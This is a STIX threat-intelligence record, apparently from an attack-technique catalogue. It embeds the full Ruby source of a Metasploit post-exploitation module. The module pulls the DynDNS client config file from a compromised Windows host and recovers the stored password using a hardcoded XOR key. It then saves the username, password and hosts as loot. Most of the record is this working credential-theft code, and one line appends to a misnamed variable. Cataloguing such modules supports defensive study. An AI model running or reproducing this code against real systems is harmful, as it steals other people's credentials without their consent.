{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c552355f-3edd-40f4-9a31-abe320137208",
    "created": "2024-08-14T16:33:11.454485Z",
    "modified": "2024-08-14T16:33:11.454489Z",
    "name": "Windows Gather DynDNS Client Password Extractor",
    "description": " This module extracts the username, password, and hosts for DynDNS version 4.1.8. This is done by downloading the config.dyndns file from the victim machine, and then automatically decode the password field. The original copy of the config file is also saved to disk.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/dyndns.rb",
            "external_id": "dyndns.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather DynDNS Client Password Extractor',\n        'Description' => %q{\n          This module extracts the username, password, and hosts for DynDNS version 4.1.8.\n          This is done by downloading the config.dyndns file from the victim machine, and then\n          automatically decode the password field. The original copy of the config file is also\n          saved to disk.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Shubham Dawra <shubham2dawra[at]gmail.com>', # SecurityXploded.com\n          'sinn3r', # Lots of code rewrite\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  #\n  # Search for the config file.\n  # Return the config file path, otherwise nil to indicate nothing was found\n  #\n  def get_config_file\n    config_paths =\n      [\n        'C:\\\\ProgramData\\\\Dyn\\\\Updater\\\\', # Vista\n        'C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\Dyn\\\\Updater\\\\' # XP and else\n      ]\n\n    # Give me the first match\n    config_file = nil\n    config_paths.each do |p|\n      tmp_path = p + 'config.dyndns'\n      begin\n        f = session.fs.file.stat(tmp_path)\n        config_file = tmp_path\n        break # We've found a valid one, break!\n      rescue StandardError\n      end\n    end\n\n    return config_file\n  end\n\n  #\n  # Download the config file, and then load it up in memory.\n  # Return the content.\n  #\n  def load_config_file(config_file)\n    f = session.fs.file.new(config_file, 'rb')\n    content = ''\n    content << f.read until f.eof?\n    p = store_loot('dyndns.raw', 'text/plain', session, 'dyndns_raw_config.dyndns')\n    vprint_good(\"Raw config file saved: #{p}\")\n    return content\n  end\n\n  #\n  # Parse the data\n  # Return: Hash { :username, :pass, :hosts }\n  #\n  def parse_config(content)\n    # Look at each line for user/pass/host\n    config_data = {}\n    user = content.scan(/Username=([\\x21-\\x7e]+)/)[0][0]\n    pass = content.scan(/Password=([\\x21-\\x7e]+)/)[0][0]\n    host = content.scan(/Host\\d=([\\x21-\\x7e]+)/)[0]\n\n    # Let's decode the pass\n    pass = decode_password(pass) if !pass.nil?\n\n    # Store data in a hash, save it to the array\n    # Might contain nil if nothing was regexed\n    config_data = {\n      user: user,\n      pass: pass,\n      hosts: host\n    }\n\n    return config_data\n  end\n\n  #\n  # Decode the password\n  #\n  def decode_password(pass)\n    pass = [pass].pack('H*')\n    s = ''\n    c = 0\n\n    pass.each_byte do |a1|\n      a2 = 't6KzXhCh'[c, 1].unpack('c')[0].to_i\n      s << (a1 ^ a2).chr\n      c = ((c + 1) % 8)\n    end\n\n    return s\n  end\n\n  #\n  # Print results and storeloot\n  #\n  def do_report(data)\n    tbl = Rex::Text::Table.new(\n      'Header' => 'DynDNS Client Data',\n      'Indent' => 1,\n      'Columns' => ['Field', 'Value']\n    )\n\n    creds = Rex::Text::Table.new(\n      'Header' => 'DynDNS Credentials',\n      'Indent' => 1,\n      'Columns' => ['User', 'Password']\n    )\n\n    # Store username/password\n    cred << [data[:user], data[:pass]]\n\n    if !creds.rows.empty?\n      p = store_loot(\n        'dyndns.creds',\n        'text/csv',\n        session,\n        creds.to_csv,\n        'dyndns_creds.csv',\n        'DynDNS Credentials'\n      )\n      print_status(\"Parsed creds stored in: #{p}\")\n    end\n\n    # Store all found hosts\n    hosts = data[:hosts]\n    hosts.each do |host|\n      tbl << ['Host', host]\n    end\n\n    print_status(tbl.to_s)\n\n    if !tbl.rows.empty?\n      p = store_loot(\n        'dyndns.data',\n        'text/plain',\n        session,\n        tbl.to_csv,\n        'dyndns_data.csv',\n        'DynDNS Client Data'\n      )\n      print_status(\"Parsed data stored in: #{p}\")\n    end\n  end\n\n  #\n  # Main function, duh\n  #\n  def run\n    # Find the config file\n    config_file = get_config_file\n    if config_file.nil?\n      print_error('No config file found, will not continue')\n      return\n    end\n\n    # Load the config file\n    print_status('Downloading config.dyndns...')\n    content = load_config_file(config_file)\n\n    if content.empty?\n      print_error('Config file seems empty, will not continue')\n      return\n    end\n\n    # Get parsed data\n    config = parse_config(content)\n\n    # Store data\n    do_report(config)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}